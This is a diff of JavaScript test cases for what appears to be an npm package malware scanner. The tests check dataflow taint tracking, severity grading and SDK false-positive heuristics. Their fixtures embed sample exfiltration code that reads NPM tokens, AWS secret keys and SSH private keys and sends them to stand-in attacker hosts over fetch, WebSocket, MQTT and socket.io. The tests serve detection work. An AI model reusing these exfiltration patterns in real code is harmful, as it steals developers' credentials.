+  });
+
+  // ==========================================================================
+  // FP-P6 Fix 6: DATAFLOW_SAFE_ENV_VARS — non-credential config vars
+  // ==========================================================================
+
+  await asyncTest('FP-P6 Fix6: process.env.NODE_TLS_REJECT_UNAUTHORIZED + fetch does NOT trigger dataflow', async () => {
+    const code = `const tls = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+fetch('https://api.example.com/data', { headers: { 'x-tls': tls } });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'NODE_TLS_REJECT_UNAUTHORIZED should NOT be treated as credential source');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix6: process.env.NPM_TOKEN + fetch still triggers dataflow', async () => {
+    const code = `const tok = process.env.NPM_TOKEN;
+fetch('https://evil.com/exfil', { body: tok });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'NPM_TOKEN should still trigger suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix6: process.env.HOME + fetch still triggers (fingerprint)', async () => {
+    const code = `const h = process.env.HOME;
+fetch('https://evil.com/exfil', { body: h });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'HOME should still trigger suspicious_dataflow (fingerprint detection)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.6.5: Array destructuring taint propagation ---
+
+  await asyncTest('DATAFLOW B9: array destructuring propagates taint', async () => {
+    const result = await runScanDirect(path.join(TESTS_DIR, 'dataflow'));
+    // Must assert the dataflow signal specifically — the fixture also reads .npmrc,
+    // which the AST scanner flags as sensitive_string independently, so a bare
+    // threats.length>0 would pass even if taint propagation (v2.6.5) were broken.
+    const dfThreats = result.threats.filter(t =>
+      t.type === 'suspicious_dataflow' &&
+      t.file && t.file.replace(/\\/g, '/').includes('array-destructure-exfil')
+    );
+    assert(dfThreats.length > 0,
+      `array-destructure-exfil.js must produce a suspicious_dataflow threat (taint through array destructuring), got ${dfThreats.length}`);
+  });
+
+  // --- v2.6.5: Object property alias taint propagation ---
+
+  await asyncTest('DATAFLOW B8: object property alias taint tracking', async () => {
+    const result = await runScanDirect(path.join(TESTS_DIR, 'dataflow'));
+    const dfThreats = result.threats.filter(t =>
+      t.type === 'suspicious_dataflow' &&
+      t.file && t.file.replace(/\\/g, '/').includes('object-alias-exfil')
+    );
+    assert(dfThreats.length > 0,
+      `object-alias-exfil.js must produce a suspicious_dataflow threat (taint through object-property alias), got ${dfThreats.length}`);
+  });
+
+  // --- v2.10.1: WebSocket/MQTT/Socket.io sink detection (B1 bypass fix) ---
+
+  await asyncTest('DATAFLOW B1: ws.send credential exfil detected as suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(
+      `const ws = require('ws');\n` +
+      `const cred = process.env.NPM_TOKEN;\n` +
+      `const socket = new ws('wss://c2.attacker.com');\n` +
+      `socket.on('open', () => socket.send(cred));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('ws.send'));
+      assert(t, 'Should detect ws.send as network sink for credential exfil');
+      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: mqtt.publish credential exfil detected', async () => {
+    const tmp = makeTempPkg(
+      `const mqtt = require('mqtt');\n` +
+      `const token = process.env.AWS_SECRET_ACCESS_KEY;\n` +
+      `const client = mqtt.connect('mqtt://c2.attacker.com');\n` +
+      `client.on('connect', () => client.publish('data', token));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('mqtt'));
+      assert(t, 'Should detect mqtt.publish as network sink for credential exfil');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: socket.io-client emit credential exfil detected', async () => {
+    const tmp = makeTempPkg(
+      `const io = require('socket.io-client');\n` +
+      `const secret = process.env.NPM_TOKEN;\n` +
+      `const socket = io('https://c2.attacker.com');\n` +
+      `socket.emit('exfil', secret);`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const envT = result.threats.find(t => t.type === 'env_access');
+      assert(envT, 'Should detect env_access for NPM_TOKEN');
+      const sinkT = result.threats.find(t => t.type === 'suspicious_module_sink');
+      assert(sinkT, 'Should detect suspicious_module_sink for socket.io-client');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: suspicious_module_sink marker emitted for ws', async () => {
+    const tmp = makeTempPkg(
+      `const ws = require('ws');\n` +
+      `const cred = process.env.NPM_TOKEN;\n` +
+      `const socket = new ws('wss://c2.attacker.com');\n` +
+      `socket.on('open', () => socket.send(cred));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_module_sink');
+      assert(t, 'Should emit suspicious_module_sink marker for ws');
+      assert(t.severity === 'MEDIUM', `Should be MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: ws echo server (legit) — no suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(
+      `const WebSocket = require('ws');\n` +
+      `const wss = new WebSocket.Server({ port: 8080 });\n` +
+      `wss.on('connection', (ws) => {\n` +
+      `  ws.on('message', (msg) => {\n` +
+      `    console.log('Received:', msg);\n` +
+      `    ws.send('echo: ' + msg);\n` +
+      `  });\n` +
+      `});`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Legit ws echo server should NOT trigger suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: ws exfil sample scores >= 35', async () => {
+    const tmp = makeTempPkg(
+      `const ws = require('ws');\n` +
+      `const cred = process.env.NPM_TOKEN;\n` +
+      `const socket = new ws('wss://c2.attacker.com');\n` +
+      `socket.on('open', () => socket.send(cred));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary.riskScore;
+      assert(score >= 35, `Score should be >= 35, got ${score}`);
+    } finally { cleanupTemp(tmp); }
+  });
+  // ==========================================================================
+  // HIGH → MEDIUM graduation for env/telemetry-only distant sources
+  // ==========================================================================
+
+  await asyncTest('DATAFLOW graduation: env_read only (non-credential) + distant sink → MEDIUM', async () => {
+    // Audit 2026-05 DF-C4: non-credential env vars (system identity like HOME) still
+    // graduate HIGH→MEDIUM when paired with a distant sink — fingerprinting is FP-prone
+    // when far from the sink. Credential-tier env vars now have a separate path (see
+    // DF-C4 regression test below).
+    const lines = [];
+    lines.push(`const home = process.env.HOME;`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://api.example.com', { headers: { 'X-Home': home } });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'MEDIUM', `env_read (HOME, non-credential) + distant sink should be MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: credential_env_read (API_TOKEN) + distant sink → HIGH (DF-C4)', async () => {
+    // Audit 2026-05 DF-C4: credential-tier env vars (NPM_TOKEN, GITHUB_TOKEN, API_TOKEN,
+    // AWS_SECRET_*) are classified as credential_env_read and participate in
+    // hasHighRiskSource — they retain HIGH severity even with a distant sink, preventing
+    // Mini Shai-Hulud-style payloads from slipping below the MEDIUM FP gates.
+    const lines = [];
+    lines.push(`const token = process.env.API_TOKEN;`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://api.example.com', { headers: { Authorization: token } });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'HIGH', `credential_env_read (API_TOKEN) + distant sink should be HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: telemetry_read only + distant sink → MEDIUM', async () => {
+    const lines = [];
+    lines.push(`const os = require('os');`);
+    lines.push(`const h = os.hostname();`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://metrics.example.com/report', { body: h });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'MEDIUM', `telemetry_read only + distant sink should be MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: credential_read + env_read mix + distant sink → HIGH (regression guard)', async () => {
+    const lines = [];
+    lines.push(`const fs = require('fs');`);
+    lines.push(`const cred = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');`);
+    lines.push(`const token = process.env.TOKEN;`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('http://evil.com', { body: cred + token });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'HIGH', `credential_read mix + distant sink should stay HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: fingerprint_read + distant sink → HIGH (regression guard)', async () => {
+    const lines = [];
+    lines.push(`const os = require('os');`);
+    lines.push(`const h = os.homedir();`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://c2.evil.com/exfil', { body: h });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'HIGH', `fingerprint_read + distant sink should stay HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+  // ==========================================================================
+  // R2: isSDKPattern() credential suffix heuristic
+  // ==========================================================================
+
+  test('R2: isSDKPattern — credential suffix + brand match + mixed domains → SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const token = process.env.KREA_API_KEY;
+fetch('https://api.krea.ai/generate', { headers: { Authorization: token } });
+fetch('https://cdn.cloudfront.net/model.bin');
+`;
+    assert(isSDKPattern('KREA_API_KEY', code) === true,
+      'KREA_API_KEY with api.krea.ai + cdn.cloudfront.net should be SDK (R2 relaxed)');
+  });
+
+  test('R2: isSDKPattern — no credential suffix + mixed domains → NOT SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const url = process.env.KREA_URL;
+fetch('https://api.krea.ai/generate');
+fetch('https://cdn.cloudfront.net/model.bin');
+`;
+    assert(isSDKPattern('KREA_URL', code) === false,
+      'KREA_URL (no credential suffix) with mixed domains should NOT be SDK');
+  });
+
+  test('R2: isSDKPattern — credential suffix but brand matches no domain → NOT SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const key = process.env.ACME_API_KEY;
+fetch('https://evil.com/steal', { body: key });
+`;
+    assert(isSDKPattern('ACME_API_KEY', code) === false,
+      'ACME_API_KEY with evil.com (no brand match) should NOT be SDK');
+  });
+
+  test('R2: isSDKPattern — credential suffix with all-match still works (strict path)', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const key = process.env.KREA_API_KEY;
+fetch('https://api.krea.ai/generate');
+fetch('https://cdn.krea.ai/assets');
+`;
+    assert(isSDKPattern('KREA_API_KEY', code) === true,
+      'KREA_API_KEY with all krea.ai domains should be SDK (strict path)');
+  });
+
+  test('R2: isSDKPattern — credential suffix + suspicious domain → NOT SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const key = process.env.KREA_API_KEY;
+fetch('https://api.krea.ai/generate');
+fetch('https://evil.ngrok.io/exfil');
+`;
+    assert(isSDKPattern('KREA_API_KEY', code) === false,
+      'KREA_API_KEY with ngrok domain should NOT be SDK (suspicious domain check)');
+  });
+
+  test('R2: isSDKPattern — _SECRET suffix triggers relaxed check (heuristic path)', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    // Use non-curated brand (KREA) to test heuristic R2 path.
+    // Curated brands (STRIPE, AWS, etc.) use strict all-domains-match.
+    const code = `
+const s = process.env.KREA_SECRET;
+fetch('https://api.krea.ai/v1/generate', { headers: { Authorization: s } });
+fetch('https://cdn.cloudfront.net/models/v2.bin');
+fetch('https://logs.datadoghq.com/track');
+`;
+    assert(isSDKPattern('KREA_SECRET', code) === true,
+      'KREA_SECRET with krea.ai + CDN + logging should be SDK (R2 relaxed)');
+  });
+  // === .config/sysmon sensitive path detection (LiteLLM/Checkmarx) ===
+
+  await asyncTest('DATAFLOW: Detects .config/sysmon readFileSync + fetch as suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+const data = fs.readFileSync('/home/user/.config/sysmon/creds.json', 'utf8');
+fetch('https://checkmarx.zone/exfil', { method: 'POST', body: data });
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'readFileSync from .config/sysmon + fetch should trigger suspicious_dataflow');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+}
+
+module.exports = { runDataflowTests };
